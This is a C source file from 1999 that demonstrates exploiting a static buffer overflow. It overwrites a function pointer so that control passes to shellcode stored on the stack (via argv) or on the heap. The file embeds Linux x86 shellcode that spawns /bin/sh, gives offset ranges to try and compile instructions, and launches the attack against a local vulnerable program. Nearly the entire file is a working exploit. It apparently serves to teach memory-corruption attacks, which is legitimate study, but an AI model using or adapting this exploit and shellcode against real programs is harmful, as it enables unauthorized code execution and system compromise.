   /*
    * Copyright (C) January 1999, Matt Conover & WSD
    *
    * This demonstrates how to exploit a static buffer to point the
    * function pointer at argv[] to execute shellcode.  This requires
    * an executable heap to succeed.
    *
    * The exploit takes two argumenst (the offset and "heap"/"stack").  
    * For argv[] method, it's an estimated offset to argv[2] from 
    * the stack top.  For the heap offset method, it's an estimated offset
    * to the target/overflow buffer from the heap top.
    *
    * Try values somewhere between 325-345 for argv[] method, and 420-450
    * for heap.
    *
    * To compile use: gcc -o exploit2 exploit2.c
    */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define ERROR -1
#define BUFSIZE 64		/* estimated diff between buf/funcptr */

#define VULPROG "./vulprog"	/* where the vulprog is */

char shellcode[] =		/* just aleph1's old shellcode (linux x86) */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0"
    "\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

u_long getesp()
{
	__asm__("movl %esp,%eax");	/* set sp as return value */
}

int main(int argc, char **argv)
{
	register int i;
	u_long sysaddr;
	char buf[BUFSIZE + sizeof(u_long) + 1];

	if (argc <= 2) {
		fprintf(stderr, "Usage: %s <offset> <heap | stack>\n",
			argv[0]);
		exit(ERROR);
	}

	if (strncmp(argv[2], "stack", 5) == 0) {
		printf
		    ("Using stack for shellcode (requires exec. stack)\n");

		sysaddr = getesp() + atoi(argv[1]);
		printf("Using 0x%lx as our argv[1] address\n\n", sysaddr);

		memset(buf, 'A', BUFSIZE + sizeof(u_long));
	}

	else {
		printf("Using heap buffer for shellcode "
		       "(requires exec. heap)\n");

		sysaddr = (u_long) sbrk(0) - atoi(argv[1]);
		printf("Using 0x%lx as our buffer's address\n\n", sysaddr);

		if (BUFSIZE + 4 + 1 < strlen(shellcode)) {
			fprintf(stderr,
				"error: buffer is too small for shellcode "
				"(min. = %d bytes)\n", strlen(shellcode));

			exit(ERROR);
		}

		strcpy(buf, shellcode);
		memset(buf + strlen(shellcode), 'A',
		       BUFSIZE - strlen(shellcode) + sizeof(u_long));
	}

	buf[BUFSIZE + sizeof(u_long)] = '\0';

	/* reverse byte order (on a little endian system) (ntohl equiv) */
	for (i = 0; i < sizeof(sysaddr); i++)
		buf[BUFSIZE + i] = ((u_long) sysaddr >> (i * 8)) & 255;

	execl(VULPROG, VULPROG, buf, shellcode, NULL);
	return 0;
}
